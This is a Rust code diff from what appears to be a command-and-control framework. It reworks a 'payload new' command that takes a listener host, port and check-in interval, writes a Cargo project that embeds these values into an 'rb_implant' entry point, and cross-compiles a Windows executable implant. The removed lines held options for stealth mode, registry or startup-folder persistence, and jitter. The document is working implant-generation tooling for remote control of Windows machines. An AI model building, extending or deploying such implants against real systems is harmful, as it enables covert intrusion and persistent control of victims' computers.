@@ -1,10 +1,19 @@
 use crate::command::*;
+use crate::message::{CommandOutput, CommandError, CommandResult};
 use clap::{Arg, ArgMatches, Command as ClapCommand};
 use std::any::Any;
+use std::error::Error;
 use std::path::PathBuf;
 
-use crate::payload::{Payload, PayloadConfig, TransportProtocol, PersistenceMethod};
-pub struct PayloadCommand {}
+// Configuration for payload generation
+#[derive(Debug)]
+pub struct PayloadConfig {
+    pub host: String,
+    pub port: u16,
+    pub interval: u64,
+}
+
+pub struct PayloadCommand;
 
 impl RbCommand for PayloadCommand {
     fn name(&self) -> &'static str {
@@ -20,70 +29,38 @@ impl RbCommand for PayloadCommand {
     }
 
     fn parse_args(&self, command_line: &str) -> Result<Box<dyn Any>, clap::Error> {
-        // Create the command with subcommands
-        let cmd = ClapCommand::new(self.name())
-            .about(self.description())
+        let cmd = ClapCommand::new("payload")
+            .about("Generate and manage payloads")
             .subcommand(
                 ClapCommand::new("new")
                     .about("Generate a new payload")
                     .arg(
                         Arg::new("lhost")
                             .long("lhost")
-                            .help("Listener host")
+                            .help("Listener host (IP or hostname)")
                             .required(true),
                     )
                     .arg(
                         Arg::new("lport")
                             .long("lport")
                             .help("Listener port")
-                            .required(true),
+                            .default_value("8080"),
                     )
                     .arg(
-                        Arg::new("protocol")
-                            .long("protocol")
-                            .help("Protocol (http, https)")
-                            .default_value("http"),
-                    )
-                    .arg(
-                        Arg::new("poll-interval")
-                            .long("poll-interval")
-                            .help("Polling interval in seconds")
+                        Arg::new("interval")
+                            .long("interval")
+                            .help("Check-in interval in seconds")
                             .default_value("5"),
-                    )
-                    .arg(
-                        Arg::new("stealth")
-                            .long("stealth")
-                            .help("Enable stealth mode")
-                            .action(clap::ArgAction::SetTrue),
-                    )
-                    .arg(
-                        Arg::new("persistence")
-                            .long("persistence")
-                            .help("Persistence method (registry, startup)")
-                            .default_value("none"),
-                    )
-                    .arg(
-                        Arg::new("jitter")
-                            .long("jitter")
-                            .help("Jitter percentage (0-30)")
-                            .default_value("0"),
                     ),
             );
 
-        // Get the arguments part (skip the command name)
-        let args_str = command_line
-            .trim_start()
-            .strip_prefix(self.name())
-            .unwrap_or("")
-            .trim_start();
-
-        // Parse the arguments with owned strings
-        let matches = cmd.try_get_matches_from(
-            vec![self.name().to_string()]
-                .into_iter()
-                .chain(args_str.split_whitespace().map(String::from)),
-        )?;
-
+        // Split the command line into arguments
+        let args: Vec<_> = command_line.split_whitespace().collect();
+        
+        // Parse the command line
+        let matches = cmd.try_get_matches_from(args)?;
+        
+        // Return the matches
         Ok(Box::new(matches))
     }
 
@@ -92,77 +69,118 @@ impl RbCommand for PayloadCommand {
         context: &mut CommandContext,
         args: Box<dyn Any>,
     ) -> CommandResult {
-        let matches = args.downcast::<ArgMatches>().unwrap();
+        let matches = match args.downcast::<ArgMatches>() {
+            Ok(matches) => *matches,
+            Err(_) => {
+                return Err(CommandError::InvalidArguments("Failed to parse arguments".to_string()));
+            }
+        };
 
         // Handle subcommands
-        match matches.subcommand() {
-            Some(("new", sub_matches)) => {
-                // Extract arguments
-                let lhost = sub_matches.get_one::<String>("lhost").unwrap();
-                let lport = sub_matches
-                    .get_one::<String>("lport")
-                    .unwrap()
-                    .parse::<u16>()
-                    .unwrap_or(8080);
-                
-                let protocol_str = sub_matches.get_one::<String>("protocol").unwrap();
-                let protocol = match protocol_str.as_str() {
-                    "https" => TransportProtocol::Https,
-                    _ => TransportProtocol::Http,
-                };
-                
-                let poll_interval = sub_matches
-                    .get_one::<String>("poll-interval")
-                    .unwrap()
-                    .parse::<u64>()
-                    .unwrap_or(5);
-                
-                let stealth_mode = sub_matches.get_flag("stealth");
-                
-                let persistence_str = sub_matches.get_one::<String>("persistence").unwrap();
-                let persistence = match persistence_str.as_str() {
-                    "registry" => Some(PersistenceMethod::RegistryRun),
-                    "startup" => Some(PersistenceMethod::StartupFolder),
-                    _ => None,
-                };
-                
-                let jitter = sub_matches
-                    .get_one::<String>("jitter")
-                    .unwrap()
-                    .parse::<u8>()
-                    .unwrap_or(0);
+        if let Some(("new", sub_matches)) = matches.subcommand() {
+            // Create a new payload
+            let host = sub_matches.get_one::<String>("lhost").unwrap().clone();
+            let port = sub_matches
+                .get_one::<String>("lport")
+                .unwrap()
+                .parse::<u16>()
+                .unwrap_or(8080);
+            let interval = sub_matches
+                .get_one::<String>("interval")
+                .unwrap()
+                .parse::<u64>()
+                .unwrap_or(5);
 
-                // Create payload config
-                let config = PayloadConfig {
-                    lhost: lhost.clone(),
-                    lport,
-                    protocol,
-                    poll_interval,
-                    stealth_mode,
-                    persistence,
-                    jitter,
-                };
+            let config = PayloadConfig {
+                host,
+                port,
+                interval,
+            };
 
-                // Generate the payload
-                match Payload::generate_with_config(&config) {
-                    Ok(path) => {
-                        // Success!
-                        CommandResult::Ok(CommandOutput::Text(format!(
-                            "Payload generated successfully: {}",
-                            path.display()
-                        )))
-                    }
-                    Err(e) => {
-                        CommandResult::Err(CommandError::ExecutionFailed(format!(
-                            "Failed to generate payload: {}",
-                            e
-                        )))
-                    }
+            // Generate the payload
+            match self.generate_payload(config) {
+                Ok(path) => {
+                    let output = format!("Payload generated successfully: {}", path.display());
+                    Ok(CommandOutput::Text(output))
+                },
+                Err(e) => {
+                    Err(CommandError::ExecutionFailed(format!("Failed to generate payload: {}", e)))
                 }
             }
-            _ => CommandResult::Err(CommandError::InvalidArguments(
-                "Unknown subcommand. Try 'payload new --lhost <HOST> --lport <PORT>'".to_string(),
-            )),
+        } else {
+            // Show help if no subcommand is specified
+            let help = "Usage: payload new --lhost <ip> --lport <port> [--interval <seconds>]".to_string();
+            Ok(CommandOutput::Text(help))
         }
+    }
+}
+
+impl PayloadCommand {
+    fn generate_payload(&self, config: PayloadConfig) -> Result<PathBuf, Box<dyn Error>> {
+        use std::fs;
+        use std::process::Command;
+
+        // Create the build directory
+        fs::create_dir_all("rb_payload_build/src")?;
+
+        // 1) Write a minimal Cargo.toml that depends on the local rb_implant crate
+        let manifest = r#"
+[package]
+name = "rb_payload"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+rb_implant = { path = "../rb_implant" }
+tokio = { version = "1", features = ["full"] }
+"#;
+        fs::write("rb_payload_build/Cargo.toml", manifest)?;
+
+        // 2) Write main.rs that configures and invokes the shared implant entry-point
+        let main_rs = format!(r#"
+use rb_implant::{{Args, run_implant_with_args}};
+
+#[tokio::main]
+async fn main() {{
+    // Use hardcoded configuration
+    let args = Args {{
+        host: "{}".to_string(),
+        port: {},
+        interval: {},
+    }};
+
+    if let Err(e) = run_implant_with_args(args).await {{
+        eprintln!("Fatal error: {{}}", e);
+        std::process::exit(1);
+    }}
+}}
+"#, config.host, config.port, config.interval);
+
+        fs::write("rb_payload_build/src/main.rs", main_rs)?;
+
+        // 3) Build the project targeting Windows GNU
+        println!("Building payload...");
+        let output = Command::new("cargo")
+            .current_dir("rb_payload_build")
+            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
+            .output()?;
+        
+        if !output.status.success() {
+            return Err(format!(
+                "Build failed: {}",
+                String::from_utf8_lossy(&output.stderr)
+            ).into());
+        }
+
+        // 4) Return the path to the .exe
+        let exe_path = PathBuf::from(
+            "rb_payload_build/target/x86_64-pc-windows-gnu/release/rb_payload.exe",
+        );
+        
+        if !exe_path.exists() {
+            return Err("Build completed but executable not found at expected path".into());
+        }
+        
+        Ok(exe_path)
     }
 }
